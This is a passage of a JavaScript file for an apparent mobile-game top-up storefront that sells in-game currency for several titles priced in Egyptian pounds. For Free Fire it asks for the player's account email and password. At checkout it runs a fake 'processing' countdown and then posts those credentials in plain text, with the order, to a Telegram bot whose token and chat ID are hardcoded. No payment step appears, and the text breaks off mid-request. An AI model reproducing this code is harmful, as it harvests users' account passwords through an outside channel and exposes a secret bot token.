document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // INTRO ANIMATION TIMING ENGINE
    // ==========================================
    const introOverlayNode = document.getElementById("animation-container");
    if (introOverlayNode) {
        setTimeout(() => {
            introOverlayNode.style.opacity = "0";
            setTimeout(() => {
                introOverlayNode.remove();
                document.body.style.overflow = "auto";
                document.body.style.overflowX = "hidden";
                
                // تهيئة القائمة العلوية والتوجيه الافتراضي للـ Home
                syncInitialNavbarLayout();
                routeTabView("#home");
            }, 800); 
        }, 3200); 
    }

    // ==========================================
    // CONFIG TELEGRAM INTEGRATION SETUP
    // ==========================================
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
    const TELEGRAM_CHAT_ID = "8851363543"; 

    // View Pages
    const storePage = document.getElementById('store-page');

    // Modals Elements
    const gameModal = document.getElementById('game-modal');
    const rechargeModal = document.getElementById('recharge-modal');
    const checkoutModal = document.getElementById('checkout-modal');
    const rechargeList = document.querySelector('.recharge-list');
    const modalTitle = document.getElementById('modal-game-title');
    const modalIcon = document.getElementById('modal-game-icon');
    const toggleContainer = document.getElementById('modal-toggle-container');
    const btnId = document.getElementById('btn-id');
    const btnAcc = document.getElementById('btn-acc');

    // Inputs Controls Configuration
    const idGroup = document.getElementById('id-input-group');
    const accGroup = document.getElementById('acc-input-group');
    const idField = document.getElementById('game-id-field');
    const emailField = document.getElementById('acc-email-field');
    const passField = document.getElementById('acc-pass-field');
    const confirmBtn = document.getElementById('confirm-btn');
    
    const checkoutActionContainer = document.getElementById('checkout-action-container');
    const successNotification = document.getElementById('success-notification');

    // Interactive State Variables
    let currentGame = ""; 
    let currentMethod = "ID"; 

    // Global Shopping Cart Engine Core Array State
    let shoppingBasket = [];
    let authenticatedUserMeta = { method: "", rawId: "", email: "", password: "" };

    // Floating UI Synchronizer Hooks
    const floatingBasketTrigger = document.getElementById('floating-basket-trigger');
    const openBasketFromProducts = document.getElementById('open-basket-from-products');

    const themes = {
        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png/revision/latest/smart/width/250/height/250?cb=20240517153409" },
        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
        "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
        "PES MOBILE": { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
        "BLOOD STRIKE": { color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
    };

    // --- Dynamic Link Mouse Positions Tracking Logic ---
    function inverseMousePosition(element, event) {
        const rect = element.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;
        return {
            x1: -(x - rect.width / 2) / 20,
            y1: -(y - rect.height / 2) / 20
        };
    }

    function handleTabClick(event) {
        const navNode = document.querySelector('.nav');
        const targetLi = event.target.closest('li');
        if (!targetLi) return;

        const width = targetLi.offsetWidth;
        const left = targetLi.getBoundingClientRect().left;
        const offsetLeft = left - navNode.getBoundingClientRect().left;

        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
        targetLi.classList.add('active');

        navNode.style.setProperty('--after-bg-position', offsetLeft);
        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
        navNode.style.setProperty('--after-bg-width', width);

        const targetHash = event.target.getAttribute('href');
        routeTabView(targetHash);
    }

    const premiumNav = document.querySelector('.nav');
    if (premiumNav) {
        const navLinks = premiumNav.querySelectorAll('li a');
        for (let i = 0; i < navLinks.length; i++) {
            navLinks[i].addEventListener('click', (e) => {
                e.preventDefault();
                handleTabClick(e);
            });
            navLinks[i].addEventListener("mousemove", (event) => {
                const tilt = inverseMousePosition(event.target, event);
                premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
                premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
            });
        }
    }

    function syncInitialNavbarLayout() {
        if (!storePage || !storePage.classList.contains('active')) return;
        if (!premiumNav) return;
        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
        if (!activeLi) return;
        
        const width = activeLi.offsetWidth;
        const left = activeLi.getBoundingClientRect().left;
        const offsetLeft = left - premiumNav.getBoundingClientRect().left;

        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
        premiumNav.style.setProperty('--after-bg-width', width);
    }

    window.addEventListener('resize', syncInitialNavbarLayout);

    function routeTabView(hashTarget) {
        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
        
        if (hashTarget === "#home" || hashTarget === "") {
            const homeSec = document.getElementById('home-content-section');
            if (homeSec) homeSec.classList.add('active-view');
        } else if (hashTarget === "#search") {
            const searchSec = document.getElementById('search-content-section');
            if (searchSec) searchSec.classList.add('active-view');
            const searchInp = document.getElementById('store-search-input');
            if (searchInp) searchInp.value = "";
            processLiveSearchFilter("");
        } else if (hashTarget === "#about") {
            const aboutSec = document.getElementById('about-content-section');
            if (aboutSec) aboutSec.classList.add('active-view');
        } else if (hashTarget === "#support") {
            const supportSec = document.getElementById('support-content-section');
            if (supportSec) supportSec.classList.add('active-view');
        }
    }

    // --- Live Filtering Search Algorithm ---
    const searchInput = document.getElementById('store-search-input');
    const searchResultsViewport = document.getElementById('search-results-viewport');

    if (searchInput) {
        searchInput.addEventListener('input', (e) => {
            processLiveSearchFilter(e.target.value);
        });
    }

    function processLiveSearchFilter(queryText) {
        if (!searchResultsViewport) return;
        const cleanedQuery = queryText.trim().toLowerCase();
        searchResultsViewport.innerHTML = "";

        if (cleanedQuery === "") {
            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
            return;
        }

        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
        let matchesCount = 0;

        sourceCards.forEach(card => {
            const indexName = card.getAttribute('data-game-search-title') || "";
            if (indexName.includes(cleanedQuery)) {
                matchesCount++;
                const clonedCard = card.cloneNode(true);
                
                clonedCard.addEventListener('click', () => {
                    if (indexName.includes("free fire")) currentGame = "FREE FIRE";
                    if (indexName.includes("pubg")) currentGame = "PUBG";
                    if (indexName.includes("call of duty")) currentGame = "CALL OF DUTY";
                    if (indexName.includes("fifa")) currentGame = "FIFA MOBILE";
                    if (indexName.includes("pes")) currentGame = "PES MOBILE";
                    if (indexName.includes("blood strike")) currentGame = "BLOOD STRIKE";
                    
                    openCredentialsModal();
                });

                searchResultsViewport.appendChild(clonedCard);
            }
        });

        if (matchesCount === 0) {
            searchResultsViewport.innerHTML = `<div class="not-found-feedback">sorry, this game is not found</div>`;
        }
    }

    // ==========================================
    // INTERACTIVE APPLICATION MATRIX MODALS
    // ==========================================
    const closeModalBtn = document.getElementById('close-modal');
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', () => {
            if (gameModal) gameModal.classList.remove('active');
        });
    }
    
    const backToIdBtn = document.getElementById('back-to-id');
    if (backToIdBtn) {
        backToIdBtn.addEventListener('click', () => {
            if (rechargeModal) rechargeModal.classList.remove('active');
            openCredentialsModal();
        });
    }
    
    const backToRechargeBtn = document.getElementById('back-to-recharge');
    if (backToRechargeBtn) {
        backToRechargeBtn.addEventListener('click', () => {
            if (checkoutModal) checkoutModal.classList.remove('active');
            if (rechargeModal) rechargeModal.classList.add('active');
            initializeProductSelection(currentGame);
        });
    }

    // Products Datasets
    const ffIdProducts = `
        <div class="recharge-item" data-id="ff_id_100" data-name="◇ 100 Diamond" data-price="55"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_210" data-name="◇ 210 Diamond" data-price="105"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_310" data-name="◇ 310 Diamond" data-price="155"><span class="item-name">◇ 310 Diamond</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_420" data-name="◇ 420 Diamond" data-price="205"><span class="item-name">◇ 420 Diamond</span><span class="item-price">205 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_520" data-name="◇ 520 Diamond" data-price="255"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_id_w_mem" data-name="★ Weekly Membership" data-price="110"><span class="item-name">★ Weekly Membership</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_id_m_mem" data-name="★ Monthly Membership" data-price="540"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>     
        <hr class="about-divider">
        <h3 class="selection-title">another sales 🔔</h3>
        <div class="recharge-item" data-id="ff_id_750" data-name="◇ 750 Diamond[اسبوعي +300]" data-price="265"><span class="item-name">◇ 750 Diamond[اسبوعي +300]</span><span class="item-price">265 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_1050" data-name="◇ 1050 Diamond[اسبوعي +600]" data-price="420"><span class="item-name">◇ 1050 Diamond[اسبوعي +600]</span><span class="item-price">420 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_1450" data-name="◇ 1450 Diamond[اسبوعي +1000]" data-price="660"><span class="item-name">◇ 1450 Diamond[اسبوعي +1000]</span><span class="item-price">660 EGP</span></div>
    `;

    const ffAccProducts = `
        <div class="recharge-item" data-id="ff_acc_100" data-name="◇ 100 Diamond Bonus" data-price="50"><span class="item-name">◇ 100 Diamond Bonus</span><span class="item-price">45 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_210" data-name="◇ 210 Diamond" data-price="95"><span class="item-name">◇ 210 Diamond</span><span class="item-price">90 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_310" data-name="◇ 310 Diamond" data-price="140"><span class="item-name">◇ 310 Diamond</span><span class="item-price">140 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_400" data-name="◇ 420 Diamond" data-price="180"><span class="item-name">◇ 400 Diamond</span><span class="item-price">185 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_500" data-name="◇ 520 Diamond" data-price="225"><span class="item-name">◇ 500 Diamond</span><span class="item-price">230 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_acc_w_mem" data-name="★ Weekly Membership" data-price="85"><span class="item-name">★ Weekly Membership</span><span class="item-price">85 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_acc_m_mem" data-name="★ Monthly Membership" data-price="430"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
        <hr class="about-divider">
        <h3 class="selection-title">another sales 🔔</h3>
        <div class="recharge-item" data-id="ff_acc_750" data-name="◇ 750 Diamond[اسبوعي +300]" data-price="220"><span class="item-name">◇ 750 Diamond[اسبوعي +300]</span><span class="item-price">220 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_1050" data-name="◇ 1050 Diamond[اسبوعي +600]" data-price="330"><span class="item-name">◇ 1050 Diamond[اسبوعي +600]</span><span class="item-price">330 EGP</span></div>
        <div class="recharge-item" data-id="ff_acc_1450" data-name="◇ 1450 Diamond[اسبوعي +1000]" data-price="430"><span class="item-name">◇ 1450 Diamond[اسبوعي +1000]</span><span class="item-price">430 EGP</span></div>
    `;

    const pubgProducts = `
        <div class="recharge-item" data-id="pubg_30" data-name="◇ 30 UC" data-price="25"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item" data-id="pubg_60" data-name="◇ 60 UC" data-price="45"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
        <div class="recharge-item" data-id="pubg_325" data-name="◇ 325 UC" data-price="215"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
        <div class="recharge-item" data-id="pubg_660" data-name="◇ 660 UC" data-price="425"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
        <div class="recharge-item" data-id="pubg_1800" data-name="◇ 1800 UC" data-price="1055"><span class="item-name">◇ 1800 UC</span><span class="item-price">1055 EGP</span></div>
        <div class="recharge-item membership" data-id="pubg_lvl_50" data-name="★ LVL (1 - 50)" data-price="255"><span class="item-name">★ LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership" data-id="pubg_lvl_100" data-name="★ LVL (1 - 100)" data-price="510"><span class="item-name">★ LVL (1 - 100)</span><span class="item-price">510 EGP</span></div>
    `;

    const codProducts = `
        <div class="recharge-item" data-id="cod_30" data-name="◇ 30 CP" data-price="20"><span class="item-name">◇ 30 CP</span><span class="item-price">20 EGP</span></div>
        <div class="recharge-item" data-id="cod_80" data-name="◇ 80 CP" data-price="50"><span class="item-name">◇ 80 CP</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item" data-id="cod_420" data-name="◇ 420 CP" data-price="230"><span class="item-name">◇ 420 CP</span><span class="item-price">230 EGP</span></div>
        <div class="recharge-item" data-id="cod_880" data-name="◇ 880 CP" data-price="455"><span class="item-name">◇ 880 CP</span><span class="item-price">455 EGP</span></div>
        <div class="recharge-item" data-id="cod_2400" data-name="◇ 2400 CP" data-price="1130"><span class="item-name">◇ 2400 CP</span><span class="item-price">1130 EGP</span></div>
        <div class="recharge-item membership" data-id="cod_bp" data-name="★ Battle Pass Premium" data-price="130"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
    `;

    const fifaProducts = `
        <div class="recharge-item" data-id="fifa_40" data-name="◇ 40 FC Points" data-price="25"><span class="item-name">◇ 40 FC Points</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item" data-id="fifa_100" data-name="◇ 100 FC Points" data-price="55"><span class="item-name">◇ 100 FC Points</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="fifa_520" data-name="◇ 520 FC Points" data-price="255"><span class="item-name">◇ 520 FC Points</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item" data-id="fifa_1070" data-name="◇ 1070 FC Points" data-price="505"><span class="item-name">◇ 1070 FC Points</span><span class="item-price">505 EGP</span></div>
    `;

    const pesProducts = `
        <div class="recharge-item" data-id="pes_137" data-name="◇ 137 Coins" data-price="70"><span class="item-name">◇ 137 Coins</span><span class="item-price">70 EGP</span></div>
        <div class="recharge-item" data-id="pes_315" data-name="◇ 315 Coins" data-price="155"><span class="item-name">◇ 315 Coins</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item" data-id="pes_578" data-name="◇ 578 Coins" data-price="265"><span class="item-name">◇ 578 Coins</span><span class="item-price">265 EGP</span></div>
        <div class="recharge-item" data-id="pes_788" data-name="◇ 788 Coins" data-price="355"><span class="item-name">◇ 788 Coins</span><span class="item-price">355 EGP</span></div>
        <div class="recharge-item" data-id="pes_1092" data-name="◇ 1092 Coins" data-price="485"><span class="item-name">◇ 1092 Coins</span><span class="item-price">485 EGP</span></div>
        <div class="recharge-item membership" data-id="pes_hero" data-name="★ heroic Pass" data-price="260"><span class="item-name">★ heroic Pass </span><span class="item-price">260 EGP</span></div>
    `;

    const bsProducts = `
        <div class="recharge-item" data-id="bs_51" data-name="◇ 51 Gold" data-price="30"><span class="item-name">◇ 51 Gold</span><span class="item-price">30 EGP</span></div>
        <div class="recharge-item" data-id="bs_105" data-name="◇ 105 Gold" data-price="55"><span class="item-name">◇ 105 Gold</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="bs_320" data-name="◇ 320 Gold" data-price="150"><span class="item-name">◇ 320 Gold</span><span class="item-price">150 EGP</span></div>
        <div class="recharge-item" data-id="bs_540" data-name="◇ 540 Gold" data-price="250"><span class="item-name">◇ 540 Gold</span><span class="item-price">250 EGP</span></div>
        <div class="recharge-item" data-id="bs_1100" data-name="◇ 1100 Gold" data-price="495"><span class="item-name">◇ 1100 Gold</span><span class="item-price">495 EGP</span></div>
    `;

    function updateBasketDOMCounters() {
        const totalItemsCount = shoppingBasket.reduce((acc, curr) => acc + curr.quantity, 0);
        
        document.querySelectorAll('.basket-badge-count, #open-basket-from-products span').forEach(el => {
            el.innerText = totalItemsCount;
        });

        if (floatingBasketTrigger) {
            if (totalItemsCount > 0) {
                floatingBasketTrigger.style.display = 'flex';
            } else {
                floatingBasketTrigger.style.display = 'none';
            }
        }
    }

    function injectReactiveQuantitySelectors() {
        if (!rechargeList) return;
        rechargeList.querySelectorAll('.recharge-item').forEach(itemNode => {
            const pId = itemNode.getAttribute('data-id');
            const pName = itemNode.getAttribute('data-name');
            const pPrice = parseFloat(itemNode.getAttribute('data-price'));

            if (!pId) return;

            const activeCartItem = shoppingBasket.find(i => i.id === pId);
            const currentQuantity = activeCartItem ? activeCartItem.quantity : 0;

            let qtyContainer = itemNode.querySelector('.product-quantity-selector');
            if (!qtyContainer) {
                qtyContainer = document.createElement('div');
                qtyContainer.className = 'product-quantity-selector';
                qtyContainer.addEventListener('click', (e) => e.stopPropagation());
                itemNode.appendChild(qtyContainer);
            }

            qtyContainer.innerHTML = `
                <button class="qty-mod-btn decrement-val">-</button>
                <span class="qty-current-val">${currentQuantity}</span>
                <button class="qty-mod-btn increment-val">+</button>
            `;

            qtyContainer.querySelector('.increment-val').onclick = () => {
                modifyCartItemQuantity(pId, pName, pPrice, 1);
            };
            qtyContainer.querySelector('.decrement-val').onclick = () => {
                modifyCartItemQuantity(pId, pName, pPrice, -1);
            };
        });
    }

    function modifyCartItemQuantity(id, name, price, modificationStep) {
        let matchedIndex = shoppingBasket.findIndex(item => item.id === id);

        if (matchedIndex > -1) {
            shoppingBasket[matchedIndex].quantity += modificationStep;
            if (shoppingBasket[matchedIndex].quantity <= 0) {
                shoppingBasket.splice(matchedIndex, 1);
            }
        } else if (modificationStep > 0) {
            shoppingBasket.push({
                id: id,
                name: name,
                price: price,
                game: currentGame,
                quantity: 1
            });
        }

        updateBasketDOMCounters();
        injectReactiveQuantitySelectors();
    }

    function initializeProductSelection(gameKey) {
        currentGame = gameKey;
        if (!rechargeList) return;
        
        if (currentGame === "PUBG") {
            rechargeList.innerHTML = pubgProducts;
        } else if (currentGame === "CALL OF DUTY") {
            rechargeList.innerHTML = codProducts;
        } else if (currentGame === "FIFA MOBILE") {
            rechargeList.innerHTML = fifaProducts;
        } else if (currentGame === "PES MOBILE") {
            rechargeList.innerHTML = pesProducts;
        } else if (currentGame === "BLOOD STRIKE") {
            rechargeList.innerHTML = bsProducts;
        } else {
            rechargeList.innerHTML = currentMethod === 'ACC' ? ffAccProducts : ffIdProducts;
        }
        
        const activeThemeColor = themes[currentGame].color;
        setTimeout(() => {
            rechargeList.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
                el.style.borderColor = activeThemeColor;
            });
        }, 10);

        if (rechargeModal) rechargeModal.classList.add('active');
        injectReactiveQuantitySelectors();
    }

    // Grid Element Events Setup -> Setting the chosen game key and opening Enter ID login modal first
    const ffCard = document.querySelector('#home-content-section .ff-card');
    if (ffCard) ffCard.addEventListener('click', () => { currentGame = "FREE FIRE"; openCredentialsModal(); });
    
    const pubgCard = document.querySelector('#home-content-section .pubg-card');
    if (pubgCard) pubgCard.addEventListener('click', () => { currentGame = "PUBG"; openCredentialsModal(); });
    
    const codCard = document.querySelector('#home-content-section .cod-card');
    if (codCard) codCard.addEventListener('click', () => { currentGame = "CALL OF DUTY"; openCredentialsModal(); });
    
    const fifaCard = document.querySelector('#home-content-section .fifa-card');
    if (fifaCard) fifaCard.addEventListener('click', () => { currentGame = "FIFA MOBILE"; openCredentialsModal(); });
    
    const pesCard = document.querySelector('#home-content-section .pes-card');
    if (pesCard) pesCard.addEventListener('click', () => { currentGame = "PES MOBILE"; openCredentialsModal(); });
    
    const bsCard = document.querySelector('#home-content-section .bs-card');
    if (bsCard) bsCard.addEventListener('click', () => { currentGame = "BLOOD STRIKE"; openCredentialsModal(); });

    function openCredentialsModal() {
        if (!gameModal || !themes[currentGame]) return;
        const currentTheme = themes[currentGame];
        
        if (modalTitle) {
            modalTitle.innerText = currentGame;
            modalTitle.style.color = currentTheme.color;
        }
        if (modalIcon) {
            modalIcon.src = currentTheme.icon;
            modalIcon.style.borderColor = currentTheme.color;
        }
        
        const inpSection = gameModal.querySelector('.input-section');
        if (inpSection) inpSection.style.borderColor = currentTheme.color;
        
        gameModal.querySelectorAll('.input-header').forEach(h => h.style.color = currentTheme.color);
        if (btnId) btnId.style.borderColor = currentTheme.color;
        if (btnAcc) btnAcc.style.borderColor = currentTheme.color;
        
        if (toggleContainer) {
            if (currentGame === "FREE FIRE") {
                toggleContainer.style.display = 'flex';
            } else {
                toggleContainer.style.display = 'none'; 
            }
        }
        
        if (idField) idField.value = "";
        if (emailField) emailField.value = "";
        if (passField) passField.value = "";
        
        switchToID();
        gameModal.classList.add('active');
    }

    function switchToID() {
        currentMethod = 'ID';
        if (!themes[currentGame]) return;
        
        if (btnId) {
            btnId.classList.add('active');
            btnId.style.background = themes[currentGame].color;
            btnId.style.color = "#000";
        }
        if (btnAcc) {
            btnAcc.classList.remove('active');
            btnAcc.style.background = "transparent";
            btnAcc.style.color = themes[currentGame].color;
        }
        
        if (idGroup) idGroup.style.display = 'block';
        if (accGroup) accGroup.style.display = 'none';
        
        if (currentGame === "FREE FIRE" && rechargeList) {
            rechargeList.innerHTML = ffIdProducts;
            injectReactiveQuantitySelectors();
        }
        validateInputs();
    }

    function switchToACC() {
        currentMethod = 'ACC';
        if (!themes[currentGame]) return;
        
        if (btnId) {
            btnId.classList.remove('active');
            btnId.style.background = "transparent";
            btnId.style.color = themes[currentGame].color;
        }
        if (btnAcc) {
            btnAcc.classList.add('active');
            btnAcc.style.background = themes[currentGame].color;
            btnAcc.style.color = "#000";
        }
        
        if (idGroup) idGroup.style.display = 'none';
        if (accGroup) accGroup.style.display = 'block';
        
        if (currentGame === "FREE FIRE" && rechargeList) {
            rechargeList.innerHTML = ffAccProducts;
            injectReactiveQuantitySelectors();
        }
        validateInputs();
    }

    if (btnId) btnId.addEventListener('click', switchToID);
    if (btnAcc) btnAcc.addEventListener('click', switchToACC);

    function validateInputs() {
        if (!confirmBtn) return;
        let isValid = false;
        
        if (currentMethod === 'ID') {
            isValid = idField ? idField.value.trim().length > 4 : false;
        } else {
            const emailValid = emailField ? emailField.value.trim().length > 4 : false;
            const passValid = passField ? passField.value.trim().length > 2 : false;
            isValid = emailValid && passValid;
        }

        confirmBtn.disabled = !isValid;
        if (isValid && themes[currentGame]) {
            confirmBtn.classList.add('active-style');
            confirmBtn.style.background = `linear-gradient(to bottom, ${themes[currentGame].color}, ${themes[currentGame].accent})`;
        } else {
            confirmBtn.classList.remove('active-style');
            confirmBtn.style.background = "#4a2107";
        }
    }

    if (idField) idField.addEventListener('input', validateInputs);
    if (emailField) emailField.addEventListener('input', validateInputs);
    if (passField) passField.addEventListener('input', validateInputs);

    // Confirm button now opens the product grid for the user to shop
    if (confirmBtn) {
        confirmBtn.addEventListener('click', () => {
            authenticatedUserMeta.method = currentMethod;
            authenticatedUserMeta.rawId = idField ? idField.value : "";
            authenticatedUserMeta.email = emailField ? emailField.value : "";
            authenticatedUserMeta.password = passField ? passField.value : "";

            if (gameModal) gameModal.classList.remove('active');
            initializeProductSelection(currentGame);
        });
    }

    function compileAndOpenCheckoutModal() {
        const basketContainer = document.getElementById('basket-items-wrapper');
        const totalPriceSumNode = document.getElementById('basket-total-price-sum');
        
        if (shoppingBasket.length === 0) {
            alert("Your shopping basket market is empty! Add products first.");
            return;
        }

        if (basketContainer) basketContainer.innerHTML = "";
        let accumulatedSum = 0;

        shoppingBasket.forEach(item => {
            const rowTotalCost = item.price * item.quantity;
            accumulatedSum += rowTotalCost;

            if (basketContainer) {
                const summaryRowElement = document.createElement('div');
                summaryRowElement.className = 'basket-summary-row';
                summaryRowElement.innerHTML = `
                    <div class="basket-item-info">
                        <div class="basket-item-title">${item.name} (x${item.quantity})</div>
                        <div class="basket-item-meta">Game Platform: ${item.game}</div>
                    </div>
                    <div class="basket-item-cost">${rowTotalCost} EGP</div>
                `;
                basketContainer.appendChild(summaryRowElement);
            }
        });

        if (totalPriceSumNode) totalPriceSumNode.innerText = `${accumulatedSum} EGP`;

        if (rechargeModal) rechargeModal.classList.remove('active');
        if (checkoutModal) checkoutModal.classList.add('active');
    }

    // Basket triggers now compile checkout layout immediately since ID information is verified beforehand
    if (floatingBasketTrigger) {
        floatingBasketTrigger.onclick = () => {
            if (shoppingBasket.length > 0) {
                compileAndOpenCheckoutModal();
            }
        };
    }
    if (openBasketFromProducts) {
        openBasketFromProducts.onclick = () => {
            if (shoppingBasket.length > 0) {
                compileAndOpenCheckoutModal();
            }
        };
    }

    // ==========================================
    // FINALIZED SECURE TRANSMISSION TO TELEGRAM
    // ==========================================
    const checkoutBtn = document.getElementById('checkout-btn');
    if (checkoutBtn) {
        checkoutBtn.addEventListener('click', () => {
            let timerSeconds = 6;
            checkoutBtn.disabled = true;
            checkoutBtn.style.cursor = "not-allowed";
            checkoutBtn.style.background = "#555";

            const intervalLoop = setInterval(() => {
                timerSeconds--;
                if (timerSeconds > 0) {
                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
                    checkoutBtn.innerText = `processing${textDots}`;
                } else {
                    clearInterval(intervalLoop);
                    executeOrderCompletion();
                }
            }, 1000);

            checkoutBtn.innerText = "processing.";
        });
    }

    function executeOrderCompletion() {
        if (successNotification) successNotification.style.display = "block";
        if (checkoutActionContainer) checkoutActionContainer.innerHTML = `<div class="done-status-block">DONE</div>`;

        let productsMessageList = shoppingBasket.map((item, idx) => {
            return `${idx + 1}. 🎮 [${item.game}] - ${item.name} x${item.quantity} -> (${item.price * item.quantity} EGP)`;
        }).join('\n');

        let overallCartTotal = shoppingBasket.reduce((sum, item) => sum + (item.price * item.quantity), 0);

        let userAccessInfoString = "";
        if (authenticatedUserMeta.method === "ID") {
            userAccessInfoString = `🆔 Target Player ID: ${authenticatedUserMeta.rawId}`;
        } else {
            userAccessInfoString = `📧 Login Email: ${authenticatedUserMeta.email}\n🔑 Account Password: ${authenticatedUserMeta.password}`;
        }

        const botFeedbackPayload = `🛒 NEW MULTI-PRODUCT MARKET ORDER \n\n${userAccessInfoString}\n\n📦 SELECTED BASKET ITEMS:\n${productsMessageList}\n\n💰 TOTAL PAYABLE SUM: ${overallCartTotal} EGP`;
        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: botFeedbackPayload
            })
        })
        .then(res => {
            console.log("Multi-product receipt dispatched successfully.");
            shoppingBasket = [];
            updateBasketDOMCounters();
            
            setTimeout(() => {
                if (checkoutModal) checkoutModal.classList.remove('active');
                if (successNotification) successNotification.style.display = "none";
                if (checkoutActionContainer) {
                    checkoutActionContainer.innerHTML = `<button id="checkout-btn" class="blue-btn">CONFIRM & COMPLETE CHECKOUT</button>`;
                    // Re-bind click event to newly inserted button
                    const newCheckoutBtn = document.getElementById('checkout-btn');
                    if (newCheckoutBtn) {
                        newCheckoutBtn.addEventListener('click', () => {
                            let timerSeconds = 6;
                            newCheckoutBtn.disabled = true;
                            newCheckoutBtn.style.cursor = "not-allowed";
                            newCheckoutBtn.style.background = "#555";

                            const loop = setInterval(() => {
                                timerSeconds--;
                                if (timerSeconds > 0) {
                                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
                                    newCheckoutBtn.innerText = `processing${textDots}`;
                                } else {
                                    clearInterval(loop);
                                    executeOrderCompletion();
                                }
                            }, 1000);
                            newCheckoutBtn.innerText = "processing.";
                        });
                    }
                }
            }, 5000);
        })
        .catch(err => {
            console.error("Transmission failed:", err);
        });
    }

    // --- Dynamic Review Feedbacks Mechanism ---
    const feedbackSubmitBtn = document.getElementById('feedback-submit-btn');
    const feedbackTextareaField = document.getElementById('feedback-textarea-field');
    const feedbackInputBox = document.getElementById('feedback-input-box');
    const feedbackThanksBox = document.getElementById('feedback-thanks-box');

    if (feedbackSubmitBtn && feedbackTextareaField) {
        feedbackSubmitBtn.addEventListener('click', () => {
            const userFeedbackContent = feedbackTextareaField.value.trim();

            if (userFeedbackContent === "") {
                alert("من فضلك اكتب تعديلك أو المشكلة أولاً.");
                return;
            }

            feedbackSubmitBtn.disabled = true;
            feedbackTextareaField.disabled = true;

            let feedbackTimeLeft = 3; 
            feedbackSubmitBtn.innerText = "processing.";

            const feedbackTimerLoop = setInterval(() => {
                feedbackTimeLeft--;
                if (feedbackTimeLeft > 0) {
                    let dotsCount = ((3 - feedbackTimeLeft) % 3) + 1;
                    feedbackSubmitBtn.innerText = "processing" + ".".repeat(dotsCount);
                } else {
                    clearInterval(feedbackTimerLoop);
                    if (feedbackInputBox) feedbackInputBox.style.display = "none";
                    if (feedbackThanksBox) feedbackThanksBox.style.display = "block";
                }
            }, 1000);

            const botFeedbackPayload = `📝 New Website Review / Bug Report\n\n💭 Feedback:\n${userFeedbackContent}`;
            const feedbackTelegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

            fetch(feedbackTelegramUrl, {
                method: 'POST',
